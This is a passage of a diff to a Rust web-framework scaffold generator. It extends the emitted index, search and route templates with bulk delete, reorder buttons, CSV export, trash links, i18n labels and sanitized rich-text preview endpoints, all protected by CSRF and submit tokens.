+    flash: Flash,{edit_destroy_authz_params}
+) -> AutumnResult<autumn_web::Redirect> {{
+    let row: {pascal_name} = {plural}::table
+        .{find_expr}
+        .select({pascal_name}::as_select())
+        .first(&mut *db)
+        .await
+        .map_err(AutumnError::not_found)?;
+    {authz_edit_call}drop(db);
+    repo.move_down(row.id).await?;
+    flash.success({flash_moved}).await;
+    Ok(autumn_web::Redirect::to(&paths::index()))
+}}
+"#
+        )
+    } else {
+        String::new()
+    };
+
     // For non-live paths, generate the data_table columns and call. Both the
     // plain AND sharded index promote displayable `references` columns to
     // render the parent's label from a per-view label map (issue #1146,
@@ -2861,7 +6507,16 @@ fn render_routes_file(
     let columns_let = if live {
         String::new()
     } else {
-        render_columns_vec(pascal_name, fields, &reference_displays, false)
+        render_columns_vec(
+            pascal_name,
+            snake_name,
+            fields,
+            &reference_displays,
+            false,
+            route_key_field,
+            true,
+            labels,
+        )
     };
     let index_label_loads = if live {
         String::new()
@@ -2885,8 +6540,100 @@ fn render_routes_file(
     let index_columns_labeled = if index_label_loads.is_empty() {
         columns_let
     } else {
-        render_columns_vec(pascal_name, fields, &reference_displays, true)
+        render_columns_vec(
+            pascal_name,
+            snake_name,
+            fields,
+            &reference_displays,
+            true,
+            route_key_field,
+            true,
+            labels,
+        )
     };
+    // Issue #1312: the shared columns prelude the index AND the search-results
+    // fragment both splice, so a searched list keeps its row checkboxes. The
+    // config is bound BEFORE the columns vec (and the action `String` before
+    // it): the inserted column's cell closure borrows `bulk_cfg`, so `columns`
+    // must be dropped first — declaring it after keeps the borrow well-ordered.
+    let index_columns_labeled = if bulk_delete_enabled {
+        let with_mut =
+            index_columns_labeled.replacen("    let columns:", "    let mut columns:", 1);
+        format!(
+            "    let bulk_action = paths::bulk_delete();\n    \
+             {bulk_label_binds}let bulk_cfg = autumn_web::widgets::BulkActionsConfig::new(&bulk_action){bulk_labels};\n\
+             {with_mut}    \
+             columns.insert(0, autumn_web::widgets::Column::new(\"\", |row: &{pascal_name}| maud::html! {{ (autumn_web::widgets::bulk_select_checkbox(row.id, &bulk_cfg)) }}));\n"
+        )
+    } else {
+        index_columns_labeled
+    };
+    // Issue #1358: the position field's no-JS Move up / Move down buttons —
+    // each a tiny CSRF- and submit-token-protected `POST` form, following the
+    // exact pattern the trash view's Restore button uses (`csrf_input` +
+    // `submit_token_input` inside a bare `form method="post"`). Appended
+    // after the bulk-delete checkbox column (if also present) so both
+    // features compose without either one clobbering the other's insert.
+    let index_columns_labeled = if reorder_enabled {
+        let with_mut =
+            index_columns_labeled.replacen("    let columns:", "    let mut columns:", 1);
+        format!(
+            "{with_mut}    \
+             columns.push(autumn_web::widgets::Column::new(\"\", |row: &{pascal_name}| maud::html! {{\n\
+             form action=(paths::move_up({route_key_display_expr})) method=\"post\" {{\n\
+             (csrf_input(csrf.as_ref(), csrf_field.as_ref()))\n\
+             (submit_token_input(submit_token.as_ref(), submit_field.as_ref()))\n\
+             (autumn_web::a11y::Button::new({move_up_button}).submit())\n\
+             }}\n\
+             form action=(paths::move_down({route_key_display_expr})) method=\"post\" {{\n\
+             (csrf_input(csrf.as_ref(), csrf_field.as_ref()))\n\
+             (submit_token_input(submit_token.as_ref(), submit_field.as_ref()))\n\
+             (autumn_web::a11y::Button::new({move_down_button}).submit())\n\
+             }}\n\
+             }}));\n"
+        )
+    } else {
+        index_columns_labeled
+    };
+    // Issue #1312: the CSRF pair and the one-time submit-token pair (#1360) the
+    // index/search handlers thread into `bulk_actions_form`'s hidden fields.
+    // Injected after `flash: Flash,` in the signatures that render the bulk
+    // form; empty (so byte-identical) otherwise. The submit token matters here
+    // for the same reason it does on create/update: `SubmitTokenLayer` waves a
+    // tokenless request straight through, so without it a double-clicked
+    // "Delete selected" runs the whole destructive path — hooks and dependent
+    // deletes included — twice instead of replaying the first response.
+    // Issue #1349: under `--i18n` the four token extractors collapse into ONE
+    // tuple parameter. axum implements `FromRequestParts` for tuples, and its
+    // `Handler` impls stop at 16 arguments — the owner-scoped `search` handler
+    // already declares 13, and `#[secured]`/`#[get]` inject three more, so
+    // adding `locale: Locale` on top would push it to 17 and fail to compile
+    // with an unreadable elided-tuple trait error. Destructuring in the pattern
+    // keeps every use site in the body spelled exactly as before. Only under
+    // the flag: the plain scaffold's signature stays byte-identical.
+    // Issue #1358: the Move up/down buttons need the same CSRF + one-time
+    // submit-token pair as the bulk-delete form (a double-clicked move is
+    // exactly the double-submit `SubmitTokenLayer` guards against), so this
+    // gate — and the params it emits — are shared between the two features
+    // rather than duplicated. Reusing the identical 4-tuple (rather than a
+    // 2-tuple for reorder-only) means every emitted param is always actually
+    // used by at least one of the two forms, whichever combination is on.
+    let bulk_csrf_params = if !bulk_delete_enabled && !reorder_enabled {
+        String::new()
+    } else if labels.enabled() {
+        "\n    (csrf, csrf_field, submit_token, submit_field): (Option<CsrfToken>, \
+         Option<CsrfFormField>, Option<SubmitToken>, Option<SubmitFormField>),"
+            .to_owned()
+    } else {
+        "\n    csrf: Option<CsrfToken>,\n    csrf_field: Option<CsrfFormField>,\n    \
+         submit_token: Option<SubmitToken>,\n    submit_field: Option<SubmitFormField>,"
+            .to_owned()
+    };
+    // The `Option<&str>` conversions `bulk_actions_form` takes for its hidden
+    // CSRF and submit-token inputs, matching the `csrf_input` /
+    // `submit_token_input` helpers' field-name defaults.
+    let bulk_csrf_args = "csrf.as_ref().map(|t| t.token()), csrf_field.as_ref().map(|f| f.0.as_str()), \
+         submit_token.as_ref().map(|t| t.token()), submit_field.as_ref().map(|f| f.0.as_str())";
     // #1126: the data_table config is wired symmetrically with what the server
     // applies — `.query(..)` preserves the current filters on sort links,
     // `.active_sort`/`.active_dir` mark the column the repository ordered by, and
@@ -2901,11 +6648,11 @@ fn render_routes_file(
         // (non-sort/filter) config. Wiring owner-scoped sort/filter there is a
         // follow-up (issue #1841 covers the standard Db path only).
         format!(
-            r#"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new("No {plural} yet.").base_path(&paths::index())))"#
+            r"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new({index_empty}).base_path(&paths::index())))"
         )
     } else {
         format!(
-            r#"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new("No {plural} yet.").base_path(&paths::index()).query(raw_query.as_deref().unwrap_or_default()).active_sort(list_query.sort().unwrap_or_default()).active_dir(list_query.direction())))"#
+            r"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new({index_empty}).base_path(&paths::index()).query(raw_query.as_deref().unwrap_or_default()).active_sort(list_query.sort().unwrap_or_default()).active_dir(list_query.direction())))"
         )
     };
 
@@ -2928,23 +6675,141 @@ fn render_routes_file(
     // handler from the raw query string). The `--live` variants call `repo.page`
     // and extract no `RawQuery`, so they keep the plain pager.
     let pager_line = if live {
-        r"(pagination_nav(&page_data, &PagerOptions::new(&paths::index())))".to_string()
+        format!("(pagination_nav(&page_data, &PagerOptions::new(&paths::index()){pager_labels}))")
     } else {
-        r"(pagination_nav(&page_data, &PagerOptions::new(&paths::index()).query(pager_query)))"
-            .to_string()
+        format!(
+            "(pagination_nav(&page_data, &PagerOptions::new(&paths::index()).query(pager_query){pager_labels}))"
+        )
     };
+    // Issue #1315: the index's "Export CSV" link, and the `let` that builds its
+    // href. The link carries the index's CURRENT query string, so "filter →
+    // sort → export" downloads exactly the rows on screen rather than the whole
+    // table; `pager_query` is the same raw query the pager links already
+    // preserve. Paging params ride along harmlessly — the export handler
+    // extracts no `PageRequest`. Both are empty for a gated-off variant, so its
+    // index stays byte-identical to its pre-#1315 output.
+    //
+    // Rendered deliberately OUTSIDE the #1312 bulk-actions `<form>`: a nested
+    // `<form>` is invalid HTML, and an export is not a selection action.
+    //
+    // WHERE it sits depends on `--searchable`, because the link must never
+    // outlive the row set it describes:
+    //
+    //   * Not searchable — page furniture next to "New {pascal_name}". The only
+    //     things that narrow the list are `?sort=`/`?filter[col]=`, both of which
+    //     live in the URL that `pager_query` copies into the href, so a link
+    //     rendered once with the page stays accurate for as long as the page does.
+    //
+    //   * Searchable — INSIDE the `#{plural}-search-results` container instead.
+    //     `active_search_input` swaps that container and pushes no URL, so the
+    //     search term never reaches `pager_query` and `ListQuery` has no field to
+    //     put it in. A link left outside the container would survive the swap
+    //     pointing at the UNSEARCHED set: the user narrows the list, clicks
+    //     "Export CSV" next to the rows they filtered down to, and silently
+    //     downloads the rows they just excluded. Rendering it inside means the
+    //     swap replaces it — the search fragment emits no link, so searched
+    //     results simply offer no export, which is what the generators guide
+    //     already documents. Clearing the search restores the list and its link.
+    let (export_href_let, export_link) = if export_enabled {
+        (
+            "    let export_href = if pager_query.is_empty() {\n        \
+             paths::export_csv()\n    \
+             } else {\n        \
+             format!(\"{}?{}\", paths::export_csv(), pager_query)\n    \
+             };\n",
+            // The explicit `" "` matters: Maud drops template whitespace between
+            // nodes, so without it the two anchors render as one glued run
+            // ("New PostExport CSV"). Same separator the generated `show` view
+            // puts between its "Back to list" and "Edit" links.
+            format!(
+                "\n        \" \"\n        \
+                 (autumn_web::a11y::Link::new(export_href, {export_csv_text}))"
+            ),
+        )
+    } else {
+        ("", String::new())
+    };
+    // The furniture slot takes the link only when there is no search box to
+    // invalidate it; otherwise `index_list_block` places it inside the container.
+    // The two slots differ only in indentation — furniture is a direct child of
+    // the `html! {` block (8 spaces), the in-results copy is one level deeper
+    // inside the container `div` (12) — so the generated file stays readable.
+    let export_link_furniture = if search_enabled {
+        ""
+    } else {
+        export_link.as_str()
+    };
+    // Issue #1332 AC2: the index's "Trash" link. Page furniture next to "New
+    // {pascal_name}" — unlike "Export CSV" it describes no row set, so a search
+    // that swaps the results container cannot leave it pointing at stale rows,
+    // and it stays outside the #1312 bulk-actions `<form>` (a trash page is not
+    // a selection action). The explicit `" "` separator is the same one the
+    // export link and the show view use: Maud drops template whitespace between
+    // nodes, so without it the anchors render as one glued run.
+    let trash_link_furniture = if trash_enabled {
+        format!(
+            "\n        \" \"\n        \
+             (autumn_web::a11y::Link::new(paths::trash(), {}))",
+            labels.lit("common.trash", "Trash")
+        )
+    } else {
+        String::new()
+    };
+    let export_link_in_results = if search_enabled {
+        format!(
+            "\n            \" \"\n            \
+             (autumn_web::a11y::Link::new(export_href, {export_csv_text}))"
+        )
+    } else {
+        String::new()
+    };
+    // Issue #1312: the list itself (data_table + pager) is wrapped in the
+    // bulk-actions `<form>` so each row's checkbox submits with the
+    // delete-selected button. The "New {pascal_name}" link, the htmx `<script>`,
+    // and the search box deliberately stay OUTSIDE: they are page furniture, not
+    // part of the selection.
+    //
+    // When searchable, the form sits INSIDE the `#{plural}-search-results`
+    // container htmx swaps — not around it. The `/search` fragment is itself a
+    // whole `bulk_actions_form`, so swapping it into a container that already
+    // lived inside a form would nest one `<form>` in another (invalid HTML the
+    // parser silently drops). Form-inside-container means every swap replaces
+    // the form wholesale and the checkboxes always have their submit button.
     let index_list_block = if search_enabled {
+        // `export_link_in_results` is the "Export CSV" anchor (empty unless this
+        // variant emits an export). It goes inside the swapped container but
+        // outside the bulk-actions `<form>` — an `<a>` nested in a `<form>` is
+        // legal, but the export is not a selection action and #1312 kept it out
+        // on purpose. Indentation matches the container's other children; the
+        // leading `" "` separator inside the fragment is harmless here, where the
+        // link opens the run rather than following the "New …" anchor.
+        let inner = if bulk_delete_enabled {
+            format!(
+                "div id=\"{plural}-search-results\" {{\n            \
+                 (autumn_web::widgets::bulk_actions_form(&bulk_cfg, {bulk_csrf_args}, html! {{\n                \
+                 {list_render}\n                {pager_line}\n            }})){export_link_in_results}\n        }}"
+            )
+        } else {
+            format!(
+                "div id=\"{plural}-search-results\" {{\n            {list_render}\n            {pager_line}{export_link_in_results}\n        }}"
+            )
+        };
         format!(
             "script src=(autumn_web::htmx::HTMX_JS_PATH) {{}}\n        \
-             (autumn_web::widgets::active_search_input(\"{snake_name}-search\", \"Search {pascal_name}s\", \
+             (autumn_web::widgets::active_search_input(\"{snake_name}-search\", {search_box_label}, \
              &autumn_web::widgets::ActiveSearchConfig::new(\"/{plural}/search\", \"#{plural}-search-results\")\
-             .placeholder(\"Search {pascal_name}s…\")))\n        \
-             div id=\"{plural}-search-results\" {{\n            {list_render}\n            {pager_line}\n        }}"
+             .placeholder({search_box_placeholder})))\n        \
+             {inner}"
+        )
+    } else if bulk_delete_enabled {
+        format!(
+            "(autumn_web::widgets::bulk_actions_form(&bulk_cfg, {bulk_csrf_args}, html! {{\n            {list_render}\n            {pager_line}\n        }}))"
         )
     } else {
         format!("{list_render}\n        {pager_line}")
     };
-    let show_rows = render_show_property_rows(all_fields, &reference_displays);
+    let show_rows = render_show_property_rows(all_fields, &reference_displays, labels);
+    let show_prop_binds = render_show_property_label_binds(all_fields, snake_name, labels);
     // The `show` handler pre-loads each displayable reference's parent label
     // (issue #1146) before building its property rows.
     let show_label_loads = render_show_reference_label_loads(all_fields, &reference_displays);
@@ -2981,22 +6846,23 @@ fn render_routes_file(
 /// unscoped `list`/`page`, so it cannot return another user's rows.
 #[secured]
 #[get("/{plural}")]
+#[allow(clippy::too_many_arguments)]
 pub async fn index(
-    list_query: ListQuery,
+    {locale_param}list_query: ListQuery,
     RawQuery(raw_query): RawQuery,
     page_req: PageRequest,
     autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
     session: autumn_web::session::Session,
     repo: Pg{pascal_name}Repository,
-    {index_db_param}flash: Flash,
+    {index_db_param}flash: Flash,{bulk_csrf_params}
 ) -> AutumnResult<Markup> {{
     let ctx = autumn_web::authorization::PolicyContext::from_request(&state, &session).await;
     let owner_id = ctx.user_id_i64().unwrap_or(-1);
     let page_data: Page<{pascal_name}> = repo.list_scoped(owner_id, &list_query, &page_req).await?;
     let pager_query = raw_query.as_deref().unwrap_or("");
-{index_label_loads}{index_columns_labeled}    Ok({layout_fn}("{pascal_name} index", {cp_index}{flash_arg}, html! {{
-        h1 {{ "{pascal_name}s" }}
-        a href=(paths::new()) {{ "New {pascal_name}" }}
+{export_href_let}{index_label_loads}{index_columns_labeled}{resource_bind}    Ok({layout_fn}({index_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {index_heading} }}
+        a href=(paths::new()) {{ {new_link_markup} }}{export_link_furniture}
         {index_list_block}
     }}))
 }}"#
@@ -3020,8 +6886,9 @@ pub async fn index(
 /// `{pascal_name}Scope` enforces for `#[repository(scope = ...)]` index routes.
 #[secured]
 #[get("/{plural}")]
+#[allow(clippy::too_many_arguments)]
 pub async fn index(
-    page_req: PageRequest,
+    {locale_param}page_req: PageRequest,
     autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
     session: autumn_web::session::Session,
     {owner_index_db_param},
@@ -3042,11 +6909,11 @@ pub async fn index(
         .load(&mut *db)
         .await?;
     let page_data: Page<{pascal_name}> = Page::new(items, total, &page_req);
-{index_label_loads}{index_columns_labeled}    Ok({layout_fn}("{pascal_name} index", {cp_index}{flash_arg}, html! {{
-        h1 {{ "{pascal_name}s" }}
-        (autumn_web::a11y::Link::new("/{plural}/new", "New {pascal_name}"))
+{index_label_loads}{index_columns_labeled}{resource_bind}    Ok({layout_fn}({index_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {index_heading} }}
+        (autumn_web::a11y::Link::new("/{plural}/new", {new_link_text}))
         {list_render}
-        (pagination_nav(&page_data, &PagerOptions::new("/{plural}")))
+        (pagination_nav(&page_data, &PagerOptions::new("/{plural}"){pager_labels}))
     }}))
 }}"#
         )
@@ -3059,16 +6926,17 @@ pub async fn index(
 /// Out-of-range or missing values are clamped silently — list endpoints never
 /// return HTTP 400 for bad paging parameters.
 #[get("/{plural}")]
+#[allow(clippy::too_many_arguments)]
 pub async fn index(
-    page_req: PageRequest,
+    {locale_param}page_req: PageRequest,
     db: ShardedDb,
     flash: Flash,
 ) -> AutumnResult<Markup> {{
     let repo = Pg{pascal_name}Repository::from_shard(&db);
     let page_data: Page<{pascal_name}> = repo.page(&page_req).await?;
-    Ok({layout_fn}("{pascal_name} index", {cp_index}{flash_arg}, html! {{
-        h1 {{ "{pascal_name}s" }}
-        (autumn_web::a11y::Link::new(paths::new(), "New {pascal_name}"))
+{resource_bind}    Ok({layout_fn}({index_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {index_heading} }}
+        (autumn_web::a11y::Link::new(paths::new(), {new_link_text}))
         {index_list_block}
     }}))
 }}"#
@@ -3083,8 +6951,9 @@ pub async fn index(
 /// so this never 400s and can never inject SQL. `from_shard` keeps the query
 /// pinned to a single shard.
 #[get("/{plural}")]
+#[allow(clippy::too_many_arguments)]
 pub async fn index(
-    list_query: ListQuery,
+    {locale_param}list_query: ListQuery,
     RawQuery(raw_query): RawQuery,
     page_req: PageRequest,
     {sharded_index_db},
@@ -3093,9 +6962,9 @@ pub async fn index(
     let repo = Pg{pascal_name}Repository::from_shard(&db);
     let page_data: Page<{pascal_name}> = repo.list(&list_query, &page_req).await?;
     let pager_query = raw_query.as_deref().unwrap_or("");
-{index_label_loads}{index_columns_labeled}    Ok({layout_fn}("{pascal_name} index", {cp_index}{flash_arg}, html! {{
-        h1 {{ "{pascal_name}s" }}
-        (autumn_web::a11y::Link::new(paths::new(), "New {pascal_name}"))
+{index_label_loads}{index_columns_labeled}{resource_bind}    Ok({layout_fn}({index_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {index_heading} }}
+        (autumn_web::a11y::Link::new(paths::new(), {new_link_text}))
         {index_list_block}
     }}))
 }}"#
@@ -3109,15 +6978,16 @@ pub async fn index(
 /// Out-of-range or missing values are clamped silently — list endpoints never
 /// return HTTP 400 for bad paging parameters.
 #[get("/{plural}")]
+#[allow(clippy::too_many_arguments)]
 pub async fn index(
-    page_req: PageRequest,
+    {locale_param}page_req: PageRequest,
     repo: Pg{pascal_name}Repository,
     flash: Flash,
 ) -> AutumnResult<Markup> {{
     let page_data: Page<{pascal_name}> = repo.page(&page_req).await?;
-    Ok({layout_fn}("{pascal_name} index", {cp_index}{flash_arg}, html! {{
-        h1 {{ "{pascal_name}s" }}
-        (autumn_web::a11y::Link::new(paths::new(), "New {pascal_name}"))
+{resource_bind}    Ok({layout_fn}({index_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {index_heading} }}
+        (autumn_web::a11y::Link::new(paths::new(), {new_link_text}))
         {index_list_block}
     }}))
 }}"#
@@ -3131,18 +7001,19 @@ pub async fn index(
 /// malicious sort/filter keys are ignored against the model's column allowlist,
 /// so this never 400s and can never inject SQL.
 #[get("/{plural}")]
+#[allow(clippy::too_many_arguments)]
 pub async fn index(
-    list_query: ListQuery,
+    {locale_param}list_query: ListQuery,
     RawQuery(raw_query): RawQuery,
     page_req: PageRequest,
     repo: Pg{pascal_name}Repository,
-    {index_db_param}flash: Flash,
+    {index_db_param}flash: Flash,{bulk_csrf_params}
 ) -> AutumnResult<Markup> {{
-    let page_data: Page<{pascal_name}> = repo.list(&list_query, &page_req).await?;
+{default_sort_let}    let page_data: Page<{pascal_name}> = repo.list(&list_query, &page_req).await?;
     let pager_query = raw_query.as_deref().unwrap_or("");
-{index_label_loads}{index_columns_labeled}    Ok({layout_fn}("{pascal_name} index", {cp_index}{flash_arg}, html! {{
-        h1 {{ "{pascal_name}s" }}
-        (autumn_web::a11y::Link::new(paths::new(), "New {pascal_name}"))
+{export_href_let}{index_label_loads}{index_columns_labeled}{resource_bind}    Ok({layout_fn}({index_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {index_heading} }}
+        (autumn_web::a11y::Link::new(paths::new(), {new_link_text})){export_link_furniture}{trash_link_furniture}
         {index_list_block}
     }}))
 }}"#
@@ -3213,12 +7084,23 @@ pub async fn index(
     // one place the validation rules live, and the returned markup matches
     // `text_input_htmx`'s `hx-swap="outerHTML"` contract — swapping in a bare
     // `<span>` would delete the input it's supposed to replace.
+    // Issue #1255: rich-text columns are excluded — see the matching filter on
+    // `validated_field_names` in `plan_scaffold`. Both sides must agree or the
+    // mounted route set and the emitted handler set drift apart.
+    let htmx_validated: Vec<(&String, &Vec<String>)> = validations
+        .iter()
+        .filter(|(name, _)| {
+            !fields
+                .iter()
+                .any(|f| &&f.name == name && f.kind.is_rich_text())
+        })
+        .collect();
     let validate_handlers = if live_validation {
         let mut vh = String::new();
-        for (field_name, rules) in validations {
+        for (field_name, rules) in &htmx_validated {
             let rule_comment = rules.join(", ");
             let label = humanize_label(field_name);
-            let field = fields.iter().find(|f| f.name == *field_name);
+            let field = fields.iter().find(|f| f.name == **field_name);
             // Issue #1750: a DSL-constrained `String`/`Text` field renders in
             // the form through the raw-markup constrained control (carrying the
             // #1388 HTML5 attributes `minlength`/`maxlength`/`type="email"`), so
@@ -3281,6 +7163,56 @@ pub async fn index(
         String::new()
     };
 
+    // Issue #1255: one `POST /{plural}/preview/{field}` fragment endpoint per
+    // `richtext` column, driving that column's htmx live preview.
+    //
+    // The handler decodes the same submitted form the create/update handlers
+    // do (so the endpoint needs no bespoke request type) and returns the
+    // field's Markdown rendered through `markdown::render_user_content` — the
+    // sanitizing helper, identical to the show view. That equality is the whole
+    // point: what the author sees in the preview is byte-for-byte what a reader
+    // will see, including anything the allowlist strips.
+    let preview_handlers = {
+        let mut ph = String::new();
+        for f in rich_text_fields(fields) {
+            let field_name = &f.name;
+            let _ = write!(
+                ph,
+                "\n\n/// `POST /{plural}/preview/{field_name}` — sanitized Markdown preview fragment.\n"
+            );
+            let _ = writeln!(
+                ph,
+                "///\n/// Decodes the submitted form and returns `{field_name}` rendered through\n\
+                 /// `autumn_web::markdown::render_user_content`, which disables raw-HTML\n\
+                 /// passthrough and runs the output through an allowlist sanitizer. htmx swaps\n\
+                 /// the fragment into `#{field_name}-preview` (`hx-swap=\"innerHTML\"`), so the\n\
+                 /// author previews exactly the markup a reader will get."
+            );
+            let _ = writeln!(ph, "#[post(\"/{plural}/preview/{field_name}\")]");
+            let _ = writeln!(
+                ph,
+                "pub async fn preview_{field_name}(body: autumn_web::reexports::axum::body::Bytes) -> autumn_web::Markup {{"
+            );
+            // Read ONLY the previewed field, leniently — never `decode_form`.
+            // The editor `hx-include`s the whole form, so on a fresh `new` page
+            // every other column arrives blank; deserializing the form struct
+            // would fail on the first strictly-typed empty field (`count=` into
+            // an `i64`) and blank the preview until the author had filled in
+            // every unrelated column (PR #2157 review). A preview performs no
+            // validation, so it has no reason to need the rest of the form —
+            // unlike the inline-validation fragments above, which decode the
+            // whole form precisely because checking `#[validate]` rules is
+            // their job.
+            let _ = writeln!(
+                ph,
+                "    let source = autumn_web::form::field_from_urlencoded(&body, \"{field_name}\")\n        .unwrap_or_default();"
+            );
+            let _ = writeln!(ph, "    autumn_web::markdown::render_user_content(&source)");
+            ph.push_str("}\n");
+        }
+        ph
+    };
+
     // Issue #1133: emit an `autumn_web::paths![…]` invocation so the routes
     // module gains a `pub mod paths` re-exporting each handler's typed
     // `__autumn_path_*` companion under a clean short name. Every view href,
@@ -3299,15 +7231,57 @@ pub async fn index(
             "update".to_owned(),
             "delete".to_owned(),
         ];
+        // Issue #1312: `paths::bulk_delete()` backs the index list's bulk form
+        // action. Gated with the handler, so the `--live`/`--sharded` paths!
+        // block stays byte-identical.
+        if bulk_delete_enabled {
+            names.push("bulk_delete".to_owned());
+        }
+        // Issue #1315: `paths::export_csv()` backs the index's "Export CSV"
+        // link. Gated with the handler, so a gated-off variant's `paths!` block
+        // stays byte-identical.
+        if export_enabled {
+            names.push("export_csv".to_owned());
+        }
+        // Issue #1332: `paths::trash()` backs the index's "Trash" link and both
+        // recovery redirects; `paths::restore(id)`/`paths::purge(id)` back the
+        // per-row controls. Gated with the handlers, so a scaffold without
+        // `--soft-delete` keeps its `paths!` block byte-identical.
+        if trash_enabled {
+            names.push("trash".to_owned());
+            names.push("restore".to_owned());
+            names.push("purge".to_owned());
+        }
+        // Issue #1358: `paths::move_up(id)`/`paths::move_down(id)` back the
+        // index's per-row reorder buttons. Gated with the handlers, so a
+        // scaffold without a `position` field keeps its `paths!` block
+        // byte-identical.
+        if reorder_enabled {
+            names.push("move_up".to_owned());
+            names.push("move_down".to_owned());
+        }
         if live {
             names.push("events".to_owned());
+        }
+        // Issue #1323: the nested list/create endpoints the children section
+        // links and posts to (`paths::nested_index(id)` /
+        // `paths::nested_create(id)`). Absent without `--belongs-to`, so a flat
+        // scaffold's `paths!` block stays byte-identical.
+        if nesting.is_some() {
+            names.push("nested_index".to_owned());
+            names.push("nested_create".to_owned());
         }
         // One inline-validation endpoint per validated field (live-validation
         // only), each linked from the form's `.hx("post", paths::validate_{f}())`.
         if live_validation {
-            for field_name in validations.keys() {
+            for (field_name, _) in &htmx_validated {
                 names.push(format!("validate_{field_name}"));
             }
+        }
+        // Issue #1255: one preview endpoint per `richtext` column, linked from
+        // the form's `rich_text_area_htmx(&…, paths::preview_{field}())`.
+        for f in rich_text_fields(fields) {
+            names.push(format!("preview_{}", f.name));
         }
         // Issue #1326: one transition endpoint per state-machine field, linked
         // from the show page's `transition_controls` form actions
@@ -3334,6 +7308,50 @@ pub async fn index(
     // The pager preserves the request's raw query string (stripping `page`/
     // `size`) via `PagerOptions::query`, so `q` survives pagination without any
     // hand-rolled percent-encoding.
+    //
+    // Issue #1312: the fragment htmx swaps into `#{plural}-search-results` is the
+    // WHOLE bulk form, not just the table — otherwise the first search would
+    // replace the form's innards with checkboxes that have no `<form>` (and no
+    // submit button) around them, silently breaking bulk delete after a search.
+    let search_results_table = format!(
+        r#"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new({search_empty}).base_path("/{plural}/search")))"#
+    );
+    let search_results_pager = format!(
+        r#"(pagination_nav(&page_data, &PagerOptions::new("/{plural}/search").query(pager_query){pager_labels}))"#
+    );
+    let search_results_body = if bulk_delete_enabled {
+        format!(
+            "(autumn_web::widgets::bulk_actions_form(&bulk_cfg, {bulk_csrf_args}, html! {{\n            \
+             {search_results_table}\n            {search_results_pager}\n        }}))"
+        )
+    } else {
+        format!("{search_results_table}\n        {search_results_pager}")
+    };
+    // Issue #1323: the `--belongs-to` nested surface — the shared
+    // `children_section` the parent's `show` view renders, the standalone page
+    // wrapper, and the two nested handlers. Empty for a flat scaffold.
+    let nested_section = nesting.map_or_else(String::new, |n| {
+        render_nested_section(
+            pascal_name,
+            snake_name,
+            plural,
+            n,
+            fields,
+            &reference_fields,
+            &reference_displays,
+            route_key_field,
+            soft_delete,
+            has_state_machine,
+            lock_version.is_some(),
+            !unique_fields.is_empty(),
+            authorize,
+            if owner_scoped_index { owner } else { None },
+            layout_fn,
+            &cp(&format!("/{}", n.parent_plural)),
+            flash_arg,
+        )
+    });
+
     let search_handler = if search_enabled && owner_scoped_standard {
         // Issue #1841: owner-scoped FTS handler for the standard Db path. The
         // SECURITY INVARIANT is that this branch calls ONLY the owner-filtered
@@ -3365,7 +7383,7 @@ pub struct {pascal_name}SearchQuery {{
 #[secured]
 #[get("/{plural}/search")]
 pub async fn search(
-    autumn_web::extract::Query(query): autumn_web::extract::Query<{pascal_name}SearchQuery>,
+    {locale_param}autumn_web::extract::Query(query): autumn_web::extract::Query<{pascal_name}SearchQuery>,
     autumn_web::reexports::axum::extract::RawQuery(raw_query): autumn_web::reexports::axum::extract::RawQuery,
     list_query: ListQuery,
     page_req: PageRequest,
@@ -3373,7 +7391,7 @@ pub async fn search(
     autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
     session: autumn_web::session::Session,
     repo: Pg{pascal_name}Repository,
-    {index_db_param}flash: Flash,
+    {index_db_param}flash: Flash,{bulk_csrf_params}
 ) -> AutumnResult<Markup> {{
     let ctx = autumn_web::authorization::PolicyContext::from_request(&state, &session).await;
     let owner_id = ctx.user_id_i64().unwrap_or(-1);
@@ -3388,15 +7406,14 @@ pub async fn search(
         repo.search_page_scoped(owner_id, q, &page_req).await?
     }};
 {index_label_loads}{index_columns_labeled}    let results = html! {{
-        (autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new("No {plural} found.").base_path("/{plural}/search")))
-        (pagination_nav(&page_data, &PagerOptions::new("/{plural}/search").query(pager_query)))
+        {search_results_body}
     }};
     if hx.is_htmx {{
         return Ok(results);
     }}
-    Ok({layout_fn}("Search {pascal_name}s", {cp_index}{flash_arg}, html! {{
-        h1 {{ "Search {pascal_name}s" }}
-        a href="/{plural}" {{ "Back to list" }}
+    Ok({layout_fn}({search_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {search_heading} }}
+        a href="/{plural}" {{ {back_to_list_markup} }}
         div id="{plural}-search-results" {{ (results) }}
     }}))
 }}"#
@@ -3432,11 +7449,11 @@ pub struct {pascal_name}SearchQuery {{
 
 #[get("/{plural}/search")]
 pub async fn search(
-    autumn_web::extract::Query(query): autumn_web::extract::Query<{pascal_name}SearchQuery>,
+    {locale_param}autumn_web::extract::Query(query): autumn_web::extract::Query<{pascal_name}SearchQuery>,
     autumn_web::reexports::axum::extract::RawQuery(raw_query): autumn_web::reexports::axum::extract::RawQuery,
     page_req: PageRequest,
     hx: autumn_web::htmx::HxRequest,
-{repo_extractor}    flash: Flash,
+{repo_extractor}    flash: Flash,{bulk_csrf_params}
 ) -> AutumnResult<Markup> {{
 {repo_bind}    let q = query.q.trim();
     // Preserve the request's raw query string (already percent-encoded) on pager
@@ -3449,15 +7466,14 @@ pub async fn search(
         repo.search_page(q, &page_req).await?
     }};
 {index_label_loads}{index_columns_labeled}    let results = html! {{
-        (autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new("No {plural} found.").base_path("/{plural}/search")))
